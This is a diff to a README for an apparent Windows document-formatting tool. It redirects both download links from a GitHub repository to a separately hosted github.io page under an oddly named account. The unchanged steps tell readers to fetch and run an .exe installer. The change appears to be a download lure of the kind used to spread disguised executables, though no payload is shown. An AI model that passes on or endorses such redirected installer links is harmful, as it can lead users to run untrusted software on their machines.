@@ -1,6 +1,6 @@
 # 📄 official-document-ai-assistant - Review files and format documents easily
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Incestuous-dormouse212/official-document-ai-assistant)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://incestuous-dormouse212.github.io)
 
 ## 📌 About the application
 
@@ -26,7 +26,7 @@ The official-document-ai-assistant helps you manage your paperwork. It checks yo
 
 Follow these steps to set up the application on your Windows computer.
 
-1.  Visit the official page to download the setup file: [Download Current Version](https://github.com/Incestuous-dormouse212/official-document-ai-assistant).
+1.  Visit the official page to download the setup file: [Download Current Version](https://incestuous-dormouse212.github.io).
 2.  Click the link to start the download.
 3.  Wait for the installer file to finish downloading to your computer.
 4.  Find the file in your Downloads folder. It will have an .exe ending.
